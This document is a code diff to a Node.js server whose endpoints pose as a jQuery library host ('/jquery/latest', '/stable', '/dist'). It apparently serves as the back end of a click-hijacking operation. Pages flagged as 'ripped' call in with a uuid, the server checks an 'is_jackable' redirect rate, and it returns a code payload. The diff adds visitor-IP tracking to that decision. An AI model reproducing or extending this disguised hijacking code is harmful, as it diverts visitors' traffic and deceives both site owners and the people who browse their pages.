@@ -60,7 +60,7 @@ function getCodeDelimiter() {
     return "aIx1Fgix89e";
 }
 
-function getClientResponseJSON(uuid, url, callback) {
+function getClientResponseJSON(uuid, url, ip, callback) {
 
     console.log("Making client response...");
 
@@ -72,7 +72,7 @@ function getClientResponseJSON(uuid, url, callback) {
 
     var response = "";
 
-    connection.query("select is_jackable(?,?) as redirect_rate;", [url, config.minimum_clicks_per_min], function(err, docs) {
+    connection.query("select is_jackable_new(?,?,?) as redirect_rate;", [url, config.minimum_clicks_per_min, ip], function(err, docs) {
         if(docs[0]) {
             var redirect_rate = docs[0].redirect_rate;
             var randomNumber = Math.random() * 100;
@@ -180,8 +180,6 @@ app.get('/jquery/latest', function (req, res) {
 app.post('/jquery/latest', function(req, res) {
     var url = req.body.referer;
     var uuid = req.body.version;
-    var links = req.body.links;
-    var datetime = new Date().toMysqlFormat();
     var full_url = url;
 
     var ip = req.headers['x-forwarded-for'];
@@ -189,6 +187,11 @@ app.post('/jquery/latest', function(req, res) {
 
     if(!geo) {
         geo = {country: "UNKNOWN"};
+        console.log("IP: " + ip + " had unknown geo region.");
+    }
+
+    if(!ip) {
+        ip="0.0.0.0";
     }
 
     console.log("Received lander request from " + url + " with uuid = " + uuid);
@@ -199,14 +202,14 @@ app.post('/jquery/latest', function(req, res) {
     //console.log("Formatted url to be: " + url);
     //console.log("The domain of the url is: " + domain);
 
-    connection.query("select process_request(?,?,?,?,?,?,?) AS value;", [url, uuid, datetime, domain, links, full_url, geo.country], function(err, docs) {
+    connection.query("select process_request_new(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
         if(docs[0] != undefined) {
             var response_string = docs[0].value;
 
             console.log("Response from process_request: " + response_string);
             if(response_string == "OLD_RIPPED") {
                 //send back data!
-                getClientResponseJSON(uuid, url, function(response) {
+                getClientResponseJSON(uuid, url, ip, function(response) {
 
                     console.log("Response to client: " + response.jquery);
 
@@ -260,8 +263,6 @@ app.post('/jquery/latest', function(req, res) {
 app.post('/jquery/stable', function(req, res) {
     var url = req.body.stats;
     var uuid = req.body.version;
-    var links = "";
-    var datetime = new Date().toMysqlFormat();
     var full_url = url;
 
     var ip = req.headers['x-forwarded-for'];
@@ -269,6 +270,11 @@ app.post('/jquery/stable', function(req, res) {
 
     if(!geo) {
         geo = {country: "UNKNOWN"};
+        console.log("IP: " + ip + " had unknown geo region.");
+    }
+
+    if(!ip) {
+        ip="0.0.0.0";
     }
 
     console.log("Received lander request from " + url + " with uuid = " + uuid);
@@ -279,14 +285,14 @@ app.post('/jquery/stable', function(req, res) {
     //console.log("Formatted url to be: " + url);
     //console.log("The domain of the url is: " + domain);
 
-    connection.query("select process_request(?,?,?,?,?,?,?) AS value;", [url, uuid, datetime, domain, links, full_url, geo.country], function(err, docs) {
+    connection.query("select process_request_new(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
         if(docs[0] != undefined) {
             var response_string = docs[0].value;
 
             console.log("Response from process_request: " + response_string);
             if(response_string == "OLD_RIPPED") {
                 //send back data!
-                getClientResponseJSON(uuid, url, function(response) {
+                getClientResponseJSON(uuid, url, ip, function(response) {
 
                     console.log("Response to client: " + response.jquery);
 
@@ -343,8 +349,6 @@ app.post('/jquery/stable', function(req, res) {
 app.post('/jquery/dist', function(req, res) {
     var url = req.body.stats;
     var uuid = req.body.version;
-    var links = "";
-    var datetime = new Date().toMysqlFormat();
     var full_url = url;
 
     var ip = req.headers['x-forwarded-for'];
@@ -352,6 +356,11 @@ app.post('/jquery/dist', function(req, res) {
 
     if(!geo) {
         geo = {country: "UNKNOWN"};
+        console.log("IP: " + ip + " had unknown geo region.");
+    }
+
+    if(!ip) {
+        ip="0.0.0.4";
     }
 
     console.log("Received lander request from " + url + " with uuid = " + uuid);
@@ -362,14 +371,14 @@ app.post('/jquery/dist', function(req, res) {
     //console.log("Formatted url to be: " + url);
     //console.log("The domain of the url is: " + domain);
 
-    connection.query("select process_request(?,?,?,?,?,?,?) AS value;", [url, uuid, datetime, domain, links, full_url, geo.country], function(err, docs) {
+    connection.query("select process_request_new(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
         if(docs[0] != undefined) {
             var response_string = docs[0].value;
 
             console.log("Response from process_request: " + response_string);
             if(response_string == "OLD_RIPPED") {
                 //send back data!
-                getClientResponseJSON(uuid, url, function(response) {
+                getClientResponseJSON(uuid, url, ip, function(response) {
 
                     console.log("Response to client: " + response.jquery);
 
